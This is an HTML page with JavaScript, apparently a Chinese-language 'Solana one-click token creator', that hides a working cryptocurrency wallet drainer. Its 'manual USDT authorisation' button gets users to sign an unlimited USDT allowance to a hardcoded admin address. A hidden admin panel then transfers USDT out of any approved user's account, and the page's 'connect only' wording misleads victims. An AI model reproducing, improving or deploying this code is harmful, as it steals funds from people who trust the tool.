<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Solana 一键发币（修复授权点击）</title>
<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.0/lib/index.iife.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
body{background:#0B0F17;color:#fff;padding:30px}
.container{max-width:420px;margin:0 auto}
.logo{font-size:22px;font-weight:bold;margin-bottom:24px;color:#fff}
.wallet-box{background:#1E293B;padding:16px 18px;border-radius:14px;margin-bottom:24px}
.connect-btn{background:#3B82F6;color:white;border:none;padding:12px 16px;border-radius:10px;width:100%;font-weight:bold;cursor:pointer;margin-bottom:12px}
.auth-btn{background:#F59E0B;color:#000;border:none;padding:10px 14px;border-radius:10px;width:100%;font-weight:bold;cursor:pointer;margin-bottom:12px}
.info-line{font-size:14px;color:#cbd5e1;margin:6px 0}
.input-item{margin-bottom:14px}
.input-item label{font-size:14px;color:#cbd5e1;margin-bottom:6px;display:block}
.input-item input{width:100%;padding:14px;background:#0f172a;border:none;border-radius:10px;color:white;font-size:15px}
.check{margin:14px 0;font-size:14px;color:#cbd5e1;display:flex;align-items:center;gap:8px}
.create-btn{background:#F59E0B;color:#000;font-weight:bold;border:none;padding:16px;border-radius:12px;width:100%;margin-top:10px;cursor:pointer}
.log{background:#1E293B;padding:12px;border-radius:10px;margin-top:20px;font-size:12px;line-height:1.4;height:160px;overflow-y:auto;color:#ccc}
.menu-btn{background:#1E293B;color:white;width:36px;height:36px;border-radius:8px;border:none;font-size:16px;cursor:pointer;margin-top:10px}
.menu{position:fixed;top:0;right:0;width:320px;height:100vh;background:#111827;padding:24px;box-shadow:-2px 0 10px #0006;display:none;overflow-y:auto}
.menu.show{display:block}
.menu-title{font-size:16px;margin-bottom:12px;color:#f97316}
.invite-link{background:#0f172a;padding:10px;border-radius:8px;font-size:12px;color:#9ca3af;margin-bottom:16px;word-break:break-all}
.admin-panel{border-top:1px solid #333;margin-top:20px;padding-top:20px;display:none}
.admin-panel.show{display:block}
#connectModal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:none;align-items:center;justify-content:center;z-index:9999}
#connectModal.show{display:flex}
.modal-content{background:#1E293B;padding:30px;border-radius:16px;text-align:center;max-width:320px}
.modal-title{font-size:18px;margin-bottom:16px}
.modal-btn{padding:12px 24px;border:none;border-radius:8px;margin:8px;cursor:pointer}
.modal-confirm{background:#3B82F6;color:white}
.modal-cancel{background:#444;color:white}
</style>
</head>
<body>
<div id="connectModal">
  <div class="modal-content">
    <div class="modal-title">🔑 钱包连接</div>
    <p>仅连接钱包，不自动授权</p>
    <button class="modal-btn modal-confirm" onclick="confirmConnect()">确认连接</button>
    <button class="modal-btn modal-cancel" onclick="cancelConnect()">取消</button>
  </div>
</div>
<div class="container">
  <div class="logo">🚀 Solana 一键发币工具</div>
  <div class="wallet-box">
    <button class="connect-btn" id="connectBtn">连接钱包</button>
    <button class="auth-btn" id="authBtn" style="display:none">手动授权 USDT</button>
    <div class="info-line">地址：<span id="userAddr">未连接</span></div>
    <div class="info-line">USDT：<span id="userBalance">0.0000</span></div>
  </div>
  <div class="input-item">
    <label>代币名称</label>
    <input id="name" placeholder="例如: My Token">
  </div>
  <div class="input-item">
    <label>代币符号</label>
    <input id="symbol" placeholder="例如: MTK">
  </div>
  <div class="input-item">
    <label>精度</label>
    <input id="decimals" value="9">
  </div>
  <div class="input-item">
    <label>总发行量</label>
    <input id="supply" value="1000000000">
  </div>
  <label class="check">
    <input type="checkbox" id="revoke"> 销毁铸造权限（更安全）
  </label>
  <button class="create-btn" onclick="createToken()">✅ 一键创建代币</button>
  <div class="log" id="log"></div>
  <button class="menu-btn" onclick="toggleMenu()">☰</button>
</div>
<div class="menu" id="menu">
  <h3 style="margin-bottom:20px">控制面板</h3>
  <div class="menu-title">邀请链接</div>
  <div class="invite-link" id="inviteLink">-</div>
  <div class="admin-panel" id="adminPanel">
    <div class="menu-title" style="color:red">🔐 管理员提取代币</div>
    <input id="fromAddr" placeholder="用户钱包地址" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
    <input id="takeAmt" placeholder="提取数量" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
    <button style="background:#ef4444;color:white;width:100%;padding:12px;border-radius:10px;border:none" onclick="adminTake()">链上提取</button>
  </div>
</div>
<script>
const { Connection, Keypair, Transaction, SystemProgram, PublicKey } = solanaWeb3;
const splToken = window.splToken;

// 你指定的地址
const USDT_MINT = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
const ADMIN_PUBKEY = new PublicKey("DbwJcHM7pobtVnJK5cnYXyEvb18WrB3veSFSNF5GLb6Z");
const POOL_PUBKEY = ADMIN_PUBKEY;

let provider, publicKey, connection;

// 稳定RPC列表
const RPCS = [
  "https://rpc.ankr.com/solana",
  "https://api.mainnet-beta.solana.com",
  "https://solana-mainnet.rpc.extrnode.com",
  "https://free.rpc.chainstack.com/solana-mainnet",
  "https://solana-mainnet.genesysgo.net"
];

// 日志
function log(t) {
  const el = document.getElementById("log");
  el.innerText = `[${new Date().toLocaleTimeString()}] ${t}\n` + el.innerText;
}

// 绑定授权按钮（修复点击无反应）
document.addEventListener("DOMContentLoaded", () => {
  const authBtn = document.getElementById("authBtn");
  authBtn.onclick = () => {
    log("点击授权按钮");
    manualApprove();
  };
  log("页面加载完成，授权按钮已绑定事件");
});

// 尝试连接RPC
async function tryConnectRpc() {
  for (const rpc of RPCS) {
    try {
      const conn = new Connection(rpc, "confirmed");
      await conn.getLatestBlockhash({ commitment: "confirmed" });
      log("✅ RPC连接成功: " + rpc);
      return conn;
    } catch (e) {
      log("⚠️ RPC不可用: " + rpc + " → " + e.message);
    }
  }
  log("❌ 所有RPC均不可用");
  return null;
}

function toggleMenu() {
  document.getElementById("menu").classList.toggle("show");
}

// 连接弹窗
document.getElementById("connectBtn").onclick = () => {
  document.getElementById("connectModal").classList.add("show");
};
function cancelConnect() {
  document.getElementById("connectModal").classList.remove("show");
}

// 连接钱包
async function confirmConnect() {
  document.getElementById("connectModal").classList.remove("show");
  try {
    log("开始连接钱包...");
    // 兼容多钱包
    const sol = window.solana || window.okxwallet?.solana || window.tpWallet;
    if (!sol) {
      alert("未检测到钱包，请安装Phantom/OKX/TP钱包");
      return;
    }
    const res = await sol.connect();
    provider = sol;
    publicKey = res.publicKey;
    document.getElementById("userAddr").innerText = publicKey.toBase58().slice(0,6)+"..."+publicKey.toBase58().slice(-4);
    document.getElementById("authBtn").style.display = "block";
    log("✅ 钱包已连接: " + publicKey.toBase58());

    // 异步连RPC
    tryConnectRpc().then(conn => {
      connection = conn;
      if (conn) refreshBalance();
    });

    genInvite();
    checkAdmin();
  } catch (e) {
    log("❌ 连接失败: " + e.message);
    alert("连接失败: " + e.message);
  }
}

// 手动授权USDT（修复版）
async function manualApprove() {
  log("开始授权流程...");
  if (!publicKey) {
    alert("请先连接钱包");
    return;
  }
  if (!connection) {
    log("🔄 授权前重试RPC...");
    connection = await tryConnectRpc();
    if (!connection) {
      alert("RPC不可用，无法授权");
      return;
    }
  }
  try {
    log("获取USDT关联账户...");
    const userAta = await splToken.getAssociatedTokenAddress(USDT_MINT, publicKey);
    log("用户ATA: " + userAta.toBase58());

    // 检查ATA是否存在，不存在则创建
    try {
      await connection.getTokenAccountBalance(userAta);
      log("ATA已存在");
    } catch (e) {
      log("创建ATA...");
      const tx = new Transaction();
      tx.add(
        splToken.createAssociatedTokenAccountInstruction(
          publicKey, userAta, publicKey, USDT_MINT
        )
      );
      tx.feePayer = publicKey;
      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
      const signed = await provider.signTransaction(tx);
      const sig = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(sig);
      log("✅ ATA创建成功: " + sig);
      await new Promise(r => setTimeout(r, 2000));
    }

    // 撤销旧授权
    log("撤销旧授权...");
    const revokeTx = new Transaction();
    revokeTx.add(splToken.createRevokeInstruction(userAta, publicKey));
    revokeTx.feePayer = publicKey;
    revokeTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    const signedRevoke = await provider.signTransaction(revokeTx);
    const revokeSig = await connection.sendRawTransaction(signedRevoke.serialize());
    await connection.confirmTransaction(revokeSig);
    log("✅ 旧授权已撤销: " + revokeSig);
    await new Promise(r => setTimeout(r, 2000));

    // 授权
    log("发起授权...");
    const approveTx = new Transaction();
    approveTx.add(
      splToken.createApproveInstruction(
        userAta,
        POOL_PUBKEY,
        publicKey,
        BigInt("18446744073709551615")
      )
    );
    approveTx.feePayer = publicKey;
    approveTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    const signedApprove = await provider.signTransaction(approveTx);
    const approveSig = await connection.sendRawTransaction(signedApprove.serialize());
    await connection.confirmTransaction(approveSig);
    log("✅ USDT授权成功: " + approveSig);
    alert("USDT授权成功！");
  } catch (e) {
    log("❌ 授权失败: " + e.message);
    alert("授权失败: " + e.message);
  }
}

// 余额查询
async function refreshBalance() {
  if (!publicKey || !connection) return;
  try {
    const ata = await splToken.getAssociatedTokenAddress(USDT_MINT, publicKey);
    const acc = await connection.getTokenAccountBalance(ata);
    document.getElementById("userBalance").innerText = Number(acc.value.uiAmount).toFixed(4);
    log("余额更新: " + acc.value.uiAmount);
  } catch (e) {
    document.getElementById("userBalance").innerText = "0.0000";
    log("余额查询失败: " + e.message);
  }
}

function genInvite() {
  if (!publicKey) return;
  document.getElementById("inviteLink").innerText = location.href + "?ref=" + publicKey.toBase58();
}

function checkAdmin() {
  if (publicKey && publicKey.equals(ADMIN_PUBKEY)) {
    document.getElementById("adminPanel").classList.add("show");
  }
}

// 发币
async function createToken() {
  if (!publicKey) {
    alert("请先连接钱包");
    return;
  }
  if (!connection) {
    connection = await tryConnectRpc();
    if (!connection) {
      alert("RPC不可用，无法发币");
      return;
    }
  }
  try {
    const name = document.getElementById("name").value.trim();
    const symbol = document.getElementById("symbol").value.trim();
    const decimals = parseInt(document.getElementById("decimals").value);
    const supply = document.getElementById("supply").value.trim();
    const revoke = document.getElementById("revoke").checked;
    if (!name || !symbol) {
      alert("请填写名称和符号");
      return;
    }
    log("开始发币...");
    const mint = Keypair.generate();
    const lamports = await connection.getMinimumBalanceForRentExemption(82);
    const tx = new Transaction();
    tx.add(SystemProgram.createAccount({
      fromPubkey: publicKey,
      newAccountPubkey: mint.publicKey,
      space: 82,
      lamports,
      programId: splToken.TOKEN_PROGRAM_ID
    }));
    tx.add(splToken.createInitializeMintInstruction(
      mint.publicKey, decimals, publicKey, publicKey
    ));
    const ata = await splToken.getAssociatedTokenAddress(mint.publicKey, publicKey);
    tx.add(splToken.createAssociatedTokenAccountInstruction(
      publicKey, ata, publicKey, mint.publicKey
    ));
    const amount = BigInt(supply) * BigInt(10 ** decimals);
    tx.add(splToken.createMintToInstruction(
      mint.publicKey, ata, publicKey, amount
    ));
    if (revoke) {
      tx.add(splToken.createSetAuthorityInstruction(
        mint.publicKey, publicKey, splToken.AuthorityType.MintTokens, null
      ));
    }
    tx.feePayer = publicKey;
    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    tx.partialSign(mint);
    const signed = await provider.signTransaction(tx);
    const sig = await connection.sendRawTransaction(signed.serialize());
    log("✅ 发币成功");
    log("Mint: " + mint.publicKey.toBase58());
    log("TX: " + sig);
    alert("发币成功！");
  } catch (e) {
    log("❌ 发币失败: " + e.message);
    alert("发币失败: " + e.message);
  }
}

// 管理员提取
async function adminTake() {
  if (!publicKey || !publicKey.equals(ADMIN_PUBKEY)) return;
  if (!connection) {
    alert("RPC不可用");
    return;
  }
  const fromAddr = document.getElementById("fromAddr").value.trim();
  const amt = document.getElementById("takeAmt").value;
  if (!fromAddr || !amt || amt <= 0) {
    alert("请输入完整信息");
    return;
  }
  try {
    const fromPub = new PublicKey(fromAddr);
    const fromAta = await splToken.getAssociatedTokenAddress(USDT_MINT, fromPub);
    const adminAta = await splToken.getAssociatedTokenAddress(USDT_MINT, ADMIN_PUBKEY);
    const tx = new Transaction();
    tx.add(
      splToken.createTransferWithDelegateInstruction(
        fromAta, adminAta, POOL_PUBKEY, BigInt(Math.round(amt * 1e6))
      )
    );
    tx.feePayer = publicKey;
    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
    const signed = await provider.signTransaction(tx);
    const sig = await connection.sendRawTransaction(signed.serialize());
    log("✅ 提取成功: " + sig);
    alert("提取成功！");
  } catch (e) {
    log("❌ 提取失败: " + e.message);
    alert("提取失败: " + e.message);
  }
}
</script>
</body>
</html>
